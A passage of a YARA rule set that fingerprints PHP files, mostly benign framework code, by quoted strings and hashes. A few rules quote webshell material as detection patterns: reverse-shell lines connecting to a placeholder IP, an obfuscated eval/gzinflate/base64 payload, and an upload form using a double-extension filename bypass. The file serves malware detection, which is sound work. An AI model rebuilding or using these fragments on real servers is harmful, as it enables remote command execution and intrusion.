      $s2 = "if (preg_match('/^X-Pingback:\\h*(.+)/',$header,$href)) {" fullword ascii
      $s3 = "with Fat-Free Framework.  If not, see <http://www.gnu.org/licenses/>." fullword ascii
      $s4 = "Load local page contents, parse HTML anchor tags, find permalinks," fullword ascii
      $s5 = "if (empty($parts['scheme']) || empty($parts['host']) ||" fullword ascii
      $s6 = "header('Content-Type: application/xml; '." fullword ascii
      $s7 = "'header'=>'Content-Type: application/xml'," fullword ascii
      $s8 = "Fat-Free Framework is distributed in the hope that it will be useful," fullword ascii
      $s9 = "if ($link->getattribute('href')==$permalink) {" fullword ascii
      $s10 = "source contents, and return XML-RPC response" fullword ascii
      $s11 = "$permalink=$link->getattribute('href');" fullword ascii
      $s12 = "$args=xmlrpc_decode_request($fw->BODY,$method,$charset);" fullword ascii
      $s13 = "$links=$doc->getelementsbytagname('a');" fullword ascii
      $s14 = "'content'=>xmlrpc_encode_request(" fullword ascii
      $s15 = "header('X-Powered-By: '.$fw->PACKAGE);" fullword ascii
      $s16 = "Foundation, either version 3 of the License, or later." fullword ascii
      $s17 = "foreach ($req['headers'] as $header)" fullword ascii
      $s18 = "// Look for pingback header" fullword ascii
      $s19 = "$this->log.=date('r').' '." fullword ascii
      $s20 = "$parts['host']==$fw->HOST) &&" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule RemoteServerWithPHPUnitCept
{
   meta:
      description = "php22 - file RemoteServerWithPHPUnitCept.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f442d686f68a4ef374f915742784c1e857a499f48b8e72c93f3a9f2acf05140c"
   strings:
      $x1 = "$I->executeCommand('run remote_server --coverage-phpunit remote_server');" fullword ascii
      $s2 = "$I->seeFileFound('index.xml', 'tests/_output/remote_server');" fullword ascii
      $s3 = "$I->wantTo('try generate remote codecoverage phpunit report');" fullword ascii
      $s4 = "$I = new CoverGuy($scenario);" fullword ascii
      $s5 = "$I->amInPath('tests/data/sandbox');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule OrderManagerLocator
{
   meta:
      description = "php22 - file OrderManagerLocator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c140744aea6074efad9b1f5cb595336b884fee4b1b73066885a0962b4f85f1d2"
   strings:
      $s1 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\DependencyInjection\\ServiceLocator\\CheckoutTenantAwareServiceLocator;" fullword ascii
      $s2 = "'Order manager for tenant \"%s\" is not defined. Please check the configuration.'," fullword ascii
      $s3 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\Exception\\UnsupportedException;" fullword ascii
      $s4 = "namespace Pimcore\\Bundle\\EcommerceFrameworkBundle\\OrderManager;" fullword ascii
      $s5 = "public function getOrderManager(string $tenant = null): IOrderManager" fullword ascii
      $s6 = "protected function buildNotFoundException(string $tenant): UnsupportedException" fullword ascii
      $s7 = "class OrderManagerLocator extends CheckoutTenantAwareServiceLocator implements IOrderManagerLocator" fullword ascii
      $s8 = "return new UnsupportedException(sprintf(" fullword ascii
      $s9 = "public function hasOrderManager(string $tenant): bool" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule PodsData
{
   meta:
      description = "php22 - file PodsData.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53f92e0e8750eaeb1403afec1b6c7a194872430c70c9f4c864b4aa69157b26e8"
   strings:
      $x1 = "* @param null $all_fields (optional) If $fields is empty then traverse all fields, argument does not need to be passed" fullword ascii
      $s2 = "&& 'post_author' == $traverse_recurse[ 'fields' ][ $traverse_recurse[ 'depth' ] + 1 ] ) {" fullword ascii
      $s3 = "$traverse[ 'table_info' ] = $this->api->get_table_info( $pod_data[ 'type' ], $pod_data[ 'name' ], $pod_data[ 'name' " fullword ascii
      $s4 = "$traverse[ 'table_info' ] = $this->api->get_table_info( $traverse[ 'pick_object' ], $traverse[ 'pick_val' ], null, $" fullword ascii
      $s5 = "if ( ( $traverse_recurse[ 'depth' ] + 1 ) < count( $traverse_recurse[ 'fields' ] ) && !empty( $traverse_recurse[ 'pod' ]" fullword ascii
      $s6 = "* @param string|array $sql The SQL to execute" fullword ascii
      $s7 = "$traverse = apply_filters( 'pods_data_traverse', $traverse, compact( 'pod', 'fields', 'joined', 'depth', 'joined_id', 'p" fullword ascii
      $s8 = "* Get the string to use in a query for matching, uses WP_Query meta_query arguments" fullword ascii
      $s9 = "* Get the string to use in a query for WHERE/HAVING, uses WP_Query meta_query arguments" fullword ascii
      $s10 = "* @param array $data Data to update (in column => value pairs). Both $data columns and $data values should be \"raw\" (neithe" fullword ascii
      $s11 = "* @param array $where A named array of WHERE clauses (in column => value pairs). Multiple clauses will be joined with ANDs." fullword ascii
      $s12 = "* @param array $data Data to insert (in column => value pairs). Both $data columns and $data values should be \"raw\" (neithe" fullword ascii
      $s13 = "`{$field_joined}`.`comment_post_ID` = `{$traverse_recurse[ 'joined' ]}`.`ID`" fullword ascii
      $s14 = "$field = $traverse_recurse[ 'fields' ][ $traverse_recurse[ 'depth' ] - 1 ];" fullword ascii
      $s15 = "&& $table_info[ 'meta_field_value' ] == $traverse_recurse[ 'fields' ][ $traverse_recurse[ 'depth' ] + 1 ] ) {" fullword ascii
      $s16 = "elseif ( 'meta_value' === $last && in_array( $pod_data[ 'type' ], array( 'post_type', 'media', 'taxonomy', 'user', '" fullword ascii
      $s17 = "$_term = $wpdb->get_row( $wpdb->prepare( \"SELECT t.*, tt.* FROM $wpdb->terms AS t INNER JOIN $wpdb->term" fullword ascii
      $s18 = "echo '<textarea cols=\"100\" rows=\"24\">' . esc_textarea( str_replace( array( '@wp_users', '@wp_' ), array( $wpdb->" fullword ascii
      $s19 = "$pod_data = array_merge( $this->api->get_table_info( $traverse_recurse[ 'pod' ], '' ), $pod_data );" fullword ascii
      $s20 = "* Gets all tables in the WP database, optionally exclude WP core" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule property_info
{
   meta:
      description = "php22 - file property_info.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3598baa3aad6b80f7e7141f708293813e6c1876811082f582d638453ae94c65e"
   strings:
      $s1 = "$container->loadFromExtension('framework', array(" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule permission_part_blade
{
   meta:
      description = "php22 - file permission-part.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4007de5e06eee0827336bf8300e0d0a566704e58461ba042a2a9b72afb9972d4"
   strings:
      $s1 = "<input type=\"radio\" value=\"1\" id=\"{{ $subPermissionTitle. '.' . $permissionAction }}_allow\" name=\"permissions[{{ $su" fullword ascii
      $s2 = "<input type=\"radio\" value=\"-1\" id=\"{{ $subPermissionTitle. '.' . $permissionAction }}_deny\" name=\"permissions[{{ $su" fullword ascii
      $s3 = "<input type=\"radio\" value=\"0\" id=\"{{ $subPermissionTitle. '.' . $permissionAction }}_inherit\" name=\"permissions[{{ $" fullword ascii
      $s4 = "{{ isset($current) && $current === 0 ? 'checked' : '' }} {{ isset($current) === false ? 'checked' : '' }} cl" fullword ascii
      $s5 = "<?php $current = current_permission_value($model, $subPermissionTitle, $permissionAction); ?>" fullword ascii
      $s6 = "{{ isset($current) && $current === -1 ? 'checked' : '' }} class=\"flat-blue jsDeny\">" fullword ascii
      $s7 = "<label class=\"control-label text-right\" style=\"display: block\">{{ trans($permissionLabel) }}</label>" fullword ascii
      $s8 = "<label class=\"radio-inline\" for=\"{{ $subPermissionTitle. '.' . $permissionAction }}_inherit\">" fullword ascii
      $s9 = "{{ trans('user::roles.inherit') }}" fullword ascii
      $s10 = "{{ trans('user::roles.allow') }}" fullword ascii
      $s11 = "<label class=\"radio-inline\" for=\"{{ $subPermissionTitle. '.' . $permissionAction }}_deny\">" fullword ascii
      $s12 = "<label class=\"radio-inline\" for=\"{{ $subPermissionTitle. '.' . $permissionAction }}_allow\">" fullword ascii
      $s13 = "subPermissionTitle. '.' . $permissionAction }}]\"" fullword ascii
      $s14 = "{{ trans('user::roles.deny') }}" fullword ascii
      $s15 = "{{ isset($current) && $current === 1 ? 'checked' : '' }} class=\"flat-blue jsAllow\">" fullword ascii
      $s16 = "bPermissionTitle. '.' . $permissionAction }}]\"" fullword ascii
      $s17 = "<div class=\"visible-sm-block visible-md-block visible-lg-block\">" fullword ascii
      $s18 = "<label class=\"control-label\">{{ trans($permissionLabel) }}</label>" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 5KB and
      8 of them
}

rule reporters_ptbr
{
   meta:
      description = "php22 - file reporters-ptbr.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fa2dd4533b49d897bbf12d4a6b34a431129909d8123cf621691e4606b1c9a395"
   strings:
      $s1 = "<li><i class=\"icon-download\"></i> <a href=\"assets/reporter-criteria.zip\">Reporter CriteriaFilter Example Code</a></li>" fullword ascii
      $s2 = "<iframe width=\"530\" height=\"298\" src=\"http://www.youtube.com/embed/FLX4zRu622A\" frameborder=\"0\" allowfullscreen></iframe" ascii
      $s3 = "<li><i class=\"icon-play\"></i> <a href=\"#video1Modal\" data-toggle=\"modal\">Basic Training Video #4: Reporters</a></li>" fullword ascii
      $s4 = "<?php include_once '_header.php' ?>" fullword ascii
      $s5 = "<?php include_once '_footer.php' ?>" fullword ascii
      $s6 = "<h3 id=\"myModalLabel\">Phreeze Training Video</h3>" fullword ascii
      $s7 = "<h3 id=\"top\">Reporters</h3>" fullword ascii
      $s8 = "<h4 id=\"related\">Related Files and Videos</h4>" fullword ascii
      $s9 = "<button class=\"btn\" data-dismiss=\"modal\" aria-hidden=\"true\">Close</button>" fullword ascii
      $s10 = "<button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">" fullword ascii
      $s11 = "<h4 id=\"overview\">Overview</h4>" fullword ascii
      $s12 = "<div id=\"video1Modal\" class=\"modal hide fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"video1Label\" aria-hidden=\"" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule OrderModifierSpec
{
   meta:
      description = "php22 - file OrderModifierSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fa2f81efd1b5f2e89b66d14a77fcc07052bd529ca402756733362f63eeb53211"
   strings:
      $s1 = "use Sylius\\Component\\Order\\Processor\\OrderProcessorInterface;" fullword ascii
      $s2 = "$this->beConstructedWith($orderProcessor, $orderItemQuantityModifier);" fullword ascii
      $s3 = "$order->getItems()->willReturn(new ArrayCollection([$existingItem->getWrappedObject()]));" fullword ascii
      $s4 = "OrderProcessorInterface $orderProcessor," fullword ascii
      $s5 = "OrderProcessorInterface $orderProcessor" fullword ascii
      $s6 = "$orderProcessor->process($order)->shouldBeCalled();" fullword ascii
      $s7 = "$order->getItems()->willReturn(new ArrayCollection([]));" fullword ascii
      $s8 = "function it_changes_quantity_of_an_item_if_same_order_item_already_exists(" fullword ascii
      $s9 = "use Sylius\\Component\\Order\\Modifier\\OrderItemQuantityModifierInterface;" fullword ascii
      $s10 = "$orderItemQuantityModifier->modify(Argument::type(OrderInterface::class), Argument::any())->shouldNotBeCalled();" fullword ascii
      $s11 = "$existingItem->getQuantity()->willReturn(2);" fullword ascii
      $s12 = "use Sylius\\Component\\Order\\Model\\OrderItemInterface;" fullword ascii
      $s13 = "use Sylius\\Component\\Order\\Modifier\\OrderModifierInterface;" fullword ascii
      $s14 = "$newItem->getQuantity()->willReturn(3);" fullword ascii
      $s15 = "namespace spec\\Sylius\\Component\\Order\\Modifier;" fullword ascii
      $s16 = "function it_adds_new_item_to_an_order_if_different_order_item_is_in_an_order(" fullword ascii
      $s17 = "use Sylius\\Component\\Order\\Model\\OrderInterface;" fullword ascii
      $s18 = "use Doctrine\\Common\\Collections\\ArrayCollection;" fullword ascii
      $s19 = "function it_implements_an_order_modifier_interface(): void" fullword ascii
      $s20 = "OrderItemQuantityModifierInterface $orderItemQuantityModifier," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule php22_reserve
{
   meta:
      description = "php22 - file reserve.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ebee7f26af69a1160a53b0a238fd5d6bc52b6e19189a178c2886e49cc0be1ce"
   strings:
      $s1 = "$process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);" fullword ascii
      $s2 = "$descriptorspec = array(0 => array(\"pipe\",\"r\"),1 => array(\"pipe\",\"w\"),2 => array(\"pipe\",\"w\"));" fullword ascii
      $s3 = "$msg = stream_get_contents($pipes[1]);" fullword ascii
      $s4 = "$msg = stream_get_contents($pipes[2]);" fullword ascii
      $s5 = "$env = array('path' => 'c:\\\\windows\\\\system32');" fullword ascii
      $s6 = "while ($cmd = socket_read($sock,1024)) {" fullword ascii
      $s7 = "while ($cmd = fread($sock,1024)) {" fullword ascii
      $s8 = "ini_set('max_execution_time',0);" fullword ascii
      $s9 = "$env = array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');" fullword ascii
      $s10 = "fwrite($pipes[0],$cmd);" fullword ascii
      $s11 = "error_reporting (E_ERROR);" fullword ascii
      $s12 = "if (substr($cmd,0,3) == 'cd ') {" fullword ascii
      $s13 = "if (trim(strtolower($cmd)) == 'exit') {" fullword ascii
      $s14 = "$cwd = trim(substr($cmd,3,-1));" fullword ascii
      $s15 = "$msg = php_uname().\"\\n------------Code by Spider-------------\\n\";" fullword ascii
      $s16 = "$sock = fsockopen($ipaddr,$port);" fullword ascii
      $s17 = "socket_connect($sock,$ipaddr,$port);" fullword ascii
      $s18 = "$ipaddr = 'xxx.xxx.xxx.xxx';" fullword ascii
      $s19 = "$sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);" fullword ascii
      $s20 = "$port = '443';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule PasswordResetsTable
{
   meta:
      description = "php22 - file PasswordResetsTable.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "df8d26ff92585530e3cf875a83b23e94d998ef6a0b5da53747855613b10810c3"
   strings:
      $x1 = "* @license   https://github.com/userfrosting/UserFrosting/blob/master/licenses/UserFrosting.md (MIT License)" fullword ascii
      $x2 = "* @author Alex Weissman (https://alexanderweissman.com)" fullword ascii
      $x3 = "* UserFrosting (http://www.userfrosting.com)" fullword ascii
      $s4 = "* See https://laravel.com/docs/5.4/migrations#tables" fullword ascii
      $s5 = "* @link      https://github.com/userfrosting/UserFrosting" fullword ascii
      $s6 = "* password_resets table migration" fullword ascii
      $s7 = "* Manages requests for password resets." fullword ascii
      $s8 = "$this->schema->create('password_resets', function (Blueprint $table) {" fullword ascii
      $s9 = "//$table->foreign('user_id')->references('id')->on('users');" fullword ascii
      $s10 = "$this->schema->drop('password_resets');" fullword ascii
      $s11 = "if (!$this->schema->hasTable('password_resets')) {" fullword ascii
      $s12 = "* Version 4.0.0" fullword ascii
      $s13 = "use UserFrosting\\System\\Bakery\\Migration;" fullword ascii
      $s14 = "namespace UserFrosting\\Sprinkle\\Account\\Database\\Migrations\\v400;" fullword ascii
      $s15 = "* @extends Migration" fullword ascii
      $s16 = "class passwordResetsTable extends Migration" fullword ascii
      $s17 = "* {@inheritDoc}" fullword ascii
      $s18 = "$table->boolean('completed')->default(0);" fullword ascii
      $s19 = "$table->timestamp('completed_at')->nullable();" fullword ascii
      $s20 = "$table->integer('user_id')->unsigned();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule PublishThemeAssetsCommand
{
   meta:
      description = "php22 - file PublishThemeAssetsCommand.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "949dbbe87978b88e3a36f043559962504f11efb9212e2d8c357b61d874ec5523"
   strings:
      $s1 = "use Illuminate\\Console\\Command;" fullword ascii
      $s2 = "class PublishThemeAssetsCommand extends Command" fullword ascii
      $s3 = "protected $description = 'Publish theme assets';" fullword ascii
      $s4 = "protected function getArguments()" fullword ascii
      $s5 = "use Symfony\\Component\\Console\\Input\\InputArgument;" fullword ascii
      $s6 = "['theme', InputArgument::OPTIONAL, 'Name of the theme you wish to publish']," fullword ascii
      $s7 = "$theme = $this->argument('theme', null);" fullword ascii
      $s8 = "protected $name = 'asgard:publish:theme';" fullword ascii
      $s9 = "namespace Modules\\Core\\Console;" fullword ascii
      $s10 = "$this->call('stylist:publish', ['theme' => $this->argument('theme')]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_phpweb
{
   meta:
      description = "php22 - file phpweb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "12f86920bbadc21d357768a80ac141715341f33ffd7a8298e6b13728e452e5e9"
   strings:
      $s1 = "<!-- TemplateBeginEditable name=\"head\" -->" fullword ascii
      $s2 = "<!-- TemplateBeginEditable name=\"doctitle\" -->" fullword ascii
      $s3 = "<form name=\"uploadForm\" method=\"post\" enctype=\"multipart/form-data\" action=\"http://www.go-qf.com/kedit/upload_cgi/upload." ascii
      $s4 = "<!-- TemplateEndEditable -->" fullword ascii
      $s5 = "<input type=\"hidden\" name=\"fileName\" id=\"fileName\" value=\"tem1p_jm.PHP;.jpg\" />" fullword ascii
      $s6 = "<select id=\"imageType\" onchange=\"javascript:parent.KindImageType(this.value);document.getElementById('KE_IMAGEsubmitButton')." ascii
      $s7 = "<input type=\"file\" name=\"fileData\" id=\"imgFile\" size=\"14\"style=\"border:1px solid #555555;\" onclick=\"javascript:docume" ascii
      $s8 = "<input type=\"hidden\" name=\"attachPath\" id=\"fileName\" value=\"news/pics/\" />" fullword ascii
      $s9 = "<select id=\"imageType\" onchange=\"javascript:parent.KindImageType(this.value);document.getElementById('KE_IMAGEsubmitButton')." ascii
      $s10 = "ntById('imgLink').value='http://';\" /></td>" fullword ascii
      $s11 = "<input type=\"file\" name=\"fileData\" id=\"imgFile\" size=\"14\"style=\"border:1px solid #555555;\" onclick=\"javascript:docume" ascii
      $s12 = "<option value=\"1\" selected=\"selected\">bendi</option>" fullword ascii
      $s13 = "< option value=\"absbottom\">absbottom</option>" fullword ascii
      $s14 = "< option value=\"baseline\">baseline</option>" fullword ascii
      $s15 = "< option value=\"texttop\">texttop</option>" fullword ascii
      $s16 = "< option value=\"absmiddle\">absmiddle</option>" fullword ascii
      $s17 = "< option value=\"middle\">middle</option>" fullword ascii
      $s18 = "< option value=\"bottom\">bottom</option>" fullword ascii
      $s19 = "<select id=\"imgAlign\" name=\"imgAlign\">" fullword ascii
      $s20 = "<option value=\"\">duiqifangshi</option>" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 7KB and
      8 of them
}

rule ParentObject
{
   meta:
      description = "php22 - file ParentObject.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "45aff72448586f4d7fcc0c711f7cf057f8f7c12208ba1119497b91346de5f94b"
   strings:
      $s1 = "private static $table_name = 'CascadeDeleteTest_ParentObject';" fullword ascii
      $s2 = "private static $has_many = [" fullword ascii
      $s3 = "private static $db = [" fullword ascii
      $s4 = "use SilverStripe\\Dev\\TestOnly;" fullword ascii
      $s5 = "use SilverStripe\\ORM\\DataObject;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ReservedWords
{
   meta:
      description = "php22 - file ReservedWords.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5d3a8315c49bf783c246fb78c4f976d9cee77adb54e7f92809e7fdbc31d656a7"
   strings:
      $x1 = "* @author David Carr - dave@novaframework.com" fullword ascii
      $s2 = "* A List of reserved words for php 5.x and 7" fullword ascii
      $s3 = "* @version 3.0" fullword ascii
      $s4 = "* Reserved Words." fullword ascii
      $s5 = "public static function getList()" fullword ascii
      $s6 = "namespace Shared\\Helpers;" fullword ascii
      $s7 = "'__halt_compiler()'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      1 of ($x*) and all of them
}


rule php22_pt
{
   meta:
      description = "php22 - file pt.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1f3b9775cfc439f3b7ebb945869bb96a2f37af22bda6d098c600f337593f8022"
   strings:
      $s1 = "* To change this template use File | Settings | File Templates." fullword ascii
      $s2 = "* User: admin" fullword ascii
      $s3 = "* Created by JetBrains PhpStorm." fullword ascii
      $s4 = "* Date: 04/10/12" fullword ascii
      $s5 = "* Time: 17:16" fullword ascii
      $s6 = "\"6\" => \"Ser notificado sempre que este ficheiro for alterado\"," fullword ascii
      $s7 = "a abrir ou a escrever no ficheiro\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule php22_platron
{
   meta:
      description = "php22 - file platron.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "02496dd2904680b7df0a2c8f2b91e9c4229563c5615f52d5bc962bfac033cccc"
   strings:
      $s1 = "* @var \\app\\models\\OrderTransaction $transaction" fullword ascii
      $s2 = "* @var \\app\\models\\Order $order" fullword ascii
      $s3 = "* @var string $url" fullword ascii
      $s4 = "<?= Html::a(Yii::t('app', 'Go To Payment'), $url) ?>" fullword ascii
      $s5 = "<script>window.location = '<?= $url ?>';</script>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Private_i3lue_2
{
   meta:
      description = "php22 - file Private-i3lue_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5eb94f89e3a7b5e1e0f9de2e867b43aabc6ba30d41062c90a41c31dff7b626a4"
   strings:
      $s1 = "eval(gzinflate(base64_decode('HZzHbutQlkXn9SNdBQ6YEzoUmHPOnDSYcxCjyK9vuSeGAT08WPees/dasOh//89//Xtt13/8o7qy8Z/N2831mB3VP/Nsrwjsf8" ascii
      $s2 = "LvPGDpQGdKJr90EVsLGZuACx1AHEadyA5uaXMIQL+H+P2axzKfrgtKe29kUyKp8aF8jW3kVVXXuL2lMrrXgLJAZQoYBzHDvhtKEy8IW2cRpS7ifOpr2nDDTsqodBm9il" ascii
      $s3 = "2hyRIT+12du7/8ki/bNRkiP+lMlvrnZ+gLf3hu7YWLFPNzVkzkCgaMRqLLOGqsLZ3SHjxa3sCNVHeaEUzOgzq0yQHs5EN/j5pnMpBS9w6gv75Zew7L9BrLxZZeumm4So" ascii
      $s4 = "JdTNJMBTTYPEMkcX/JvJAujDRp8t5uSLgS9TPTxoggnXlcHQEkZ1z9ps7V38wUhhsnpmrXf2TvNkJNJkp0cwW1rmrSE3Hsm+9PdygZwYaPh3dDTYtJmFEs0yIhhXBOXB" ascii
      $s5 = "7tDxvIlbGVPrCmKSmK9EATGfobiveiMnVhBViJsimVj+KDtN+6KTDLXmlAUHnS7eQqBF8pq/N4fhlXL3/hiqgOc9XC28s/8HhuxrqWavRFTpI6KVUAqQU0a8SUQuDZMN" ascii
      $s6 = "TL8bC+7Xd0Y0IwflkrSK5mUT1w5Cj4HYKIwgaQhM0Bx4xU1+qJq5hmd82itBfs/uYCe3prbbpIRF+TqPkl8wTAMfo6Yrh96ahuuSjFODLlqH5lld859edEhAZ+oUNXdN" ascii
      $s7 = "YRYN+8UVrmGzdZOLnxi7Y0402CTIvMdx3E++R25ftpOGk7yIZTHOP7XONgvXScYo1iUWjrrwGQ9/sXlYWQdTjKKpweQicH5Amz8AQ+iYbXqK4fq925foXcB1xq+ja933" ascii
      $s8 = "o2cgkB+6rwfTenRQ/pCXKPGsWQG20XLbBDF81Q88FEj8VaplCEUVGFzuCatYXBqwRBqgLBK7pA8JV/X+YLJOn6/u///o9//etf//mPf//Pf/37/wA=')));" fullword ascii
      $s9 = "eE/sb46pTC2G8PjKz/7v3chi3XREad47Uhrgdzi1Vy84Ae+L3+loqXRGBngim1w1hfoC3HNgdUORWTxWGpEqTy9I/wVQsl5oLjoDgVprZ5Es6iC3jh3kWw/HJT+AoGBu" ascii
      $s10 = "7gasJtLndfqRgkJP1taMhQLW/t/ert4QJcaleYeEyj5RTiYcF1ijnzarWJAmjbXsVKAahzoKkRBOtn3ucOQ8+vQ+ljZGpk/qCpAhxeqoX12zv4cFfi5r2orCdQYkqXgM" ascii
      $s11 = "6yaCU6Olyh/8K/w4HhW5S5+xPHLf1UzDev9Emds81ZYRJkJnniPHIEyeZ7qA9Qv9qb8TuqX8NvQb6WCA1UlMocRlWouuvAZPdlzSzrUkfuHFO1g7vrZ+4fpnjQDOZTzw" ascii
      $s12 = "C2rbIc0hjwTufmkML6Xa1PiBwAnhJJWbUgEvb94oMGl2CAFmlEzrHtAhvFxLR1aiYdpy/WB3QZFtbTDVDAryNfX+gEyewrXFsTsCuJSTyTXfx6rujMIy5GV/4vj1kiyt" ascii
      $s13 = "XhmePWh7j8E8wAdu5QQ97oQIvnC8rz7VGackbHn47yb3SJA5bi6BuZv3//Teuxezf3eyhmH1BItBMWmhSIdxZTsNyEikm1vEP01QrXnEzS4SJ5U62yUUfKfsfk6T6Z5c" ascii
      $s14 = "0q7gROlZBtIp0mwaz6s9rbSKhM3myeGdW5NpS+kVKoZ+Br9ww5YNAeigzjsRIfUHeXpAz//6OQcyel78wMcLxbB+Bh1xJNXwUPvqpR7dEp9VC7A2Zo1PY0k1oaJxPzy0" ascii
      $s15 = "dl8y34tugvw8gafxS5NLSQBvLSlw5cTApvYwuphXpN1bGH/63aoPszBpS9Om8gBUDmetYCzl4f6P//7HDpLRFRrzP51VRUfkLPy6Ru3Fj/iPilG3CxdE8LzJSy46rzTR" ascii
      $s16 = "m0tPdkeFJUsmNCGch3pRIBHDfm8iNNeeuFWcROWnCeL51DrqB1b8E4Lcz8fhAwDQzH5IeLWN5Buk1d077OkHvHSMNoS//G+Cvf4AkxY3hVQeYNBwPvyqKk0PFF8x48OO" ascii
      $s17 = "E+CnBi+oOCc//iLWMUbAC/kP3iVoJmMQ8wgtCo5ZalGnhpCJ1zy+qdamGIS6EQR9pf1yPOqLjiiQHy/A5gWg+8tK0eACbYRGvEhFdSeYrS3m+Br7cW0cpuV8BpPx/4wM" ascii
      $s18 = "iBRHw1iL8oyWuyYgZyoSIgmePNz1lQ4uSo+05+OvL5cWObAOopIEqDC6yHgolwNNVXm/Ek37/ZhE/bxoQFm//KD2SGWmk+t9a4JWEGU4TnsWddkdfbhNC8GeyoBnKmxB" ascii
      $s19 = "2/FX8bPV/aWOSPLhnxWkz8+M5wcB9haO0K3PAyYyG+bWg3JJCE7CP8OFMpwFD+yw0hwUAnsJXwoNeIw1fk69RHR7N9S0bg8ptG38KuF0ZKscvtPr8AZmtjCuq+qIrlfP" ascii
      $s20 = "/gOW0m5eOR5zps04MAy1KdnFjaTJAbts/lnjDvI8YMZHs4LsI6Q88tqjNsH5yexy9J7dz68/le/Muq9u8VTqC5jEOiwKWBhZupxON3bY53oq4EB6AOAAirNMWJ2YqA+f" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      8 of them
}

rule OrderInterface
{
   meta:
      description = "php22 - file OrderInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "09df8b04d0f90ed9a5decad9a5e20dcf2d60c6f605db594b71eef51799483c2e"
   strings:
      $s1 = "* @param \\DateTimeInterface|null $checkoutCompletedAt" fullword ascii
      $s2 = "public function getAdjustmentsRecursively(?string $type = null): Collection;" fullword ascii
      $s3 = "public function getCheckoutCompletedAt(): ?\\DateTimeInterface;" fullword ascii
      $s4 = "* @return Collection|AdjustmentInterface[]" fullword ascii
      $s5 = "* @return Collection|OrderItemInterface[]" fullword ascii
      $s6 = "public function getAdjustmentsTotalRecursively(?string $type = null): int;" fullword ascii
      $s7 = "public function setCheckoutCompletedAt(?\\DateTimeInterface $checkoutCompletedAt): void;" fullword ascii
      $s8 = "* @return \\DateTimeInterface|null" fullword ascii
      $s9 = "* @param OrderItemInterface $item" fullword ascii
      $s10 = "public function getItems(): Collection;" fullword ascii
      $s11 = "* @param string|null $notes" fullword ascii
      $s12 = "* @param string|null $type" fullword ascii
      $s13 = "interface OrderInterface extends AdjustableInterface, ResourceInterface, TimestampableInterface" fullword ascii
      $s14 = "* @param string|null $number" fullword ascii
      $s15 = "* @param string $state" fullword ascii
      $s16 = "public function getTotalQuantity(): int;" fullword ascii
      $s17 = "use Sylius\\Component\\Resource\\Model\\TimestampableInterface;" fullword ascii
      $s18 = "use Sylius\\Component\\Resource\\Model\\ResourceInterface;" fullword ascii
      $s19 = "public function getNotes(): ?string;" fullword ascii
      $s20 = "public function getState(): string;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule PromoteUserCommand
{
   meta:
      description = "php22 - file PromoteUserCommand.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0b173a22a14343e2b316a0e617f95a75422c4a609a053b6db67ca7c1d81af665"
   strings:
      $x1 = "protected function executeRoleCommand(InputInterface $input, OutputInterface $output, UserInterface $user, array $securityRo" fullword ascii
      $s2 = "$output->writeln(sprintf('<error>User \"%s\" did already have \"%s\" security role.</error>', (string) $user, $securityRole));" fullword ascii
      $s3 = "$output->writeln(sprintf('<error>User \"%s\" did already have \"%s\" security role.</error>', (string) $user, $secur" fullword ascii
      $s4 = "$output->writeln(sprintf('Security role <comment>%s</comment> has been added to user <comment>%s</comment>', $securi" fullword ascii
      $s5 = "protected function executeRoleCommand(InputInterface $input, OutputInterface $output, UserInterface $user, array $securityRoles)" ascii
      $s6 = "The <info>sylius:user:promote</info> command promotes a user by adding security roles" fullword ascii
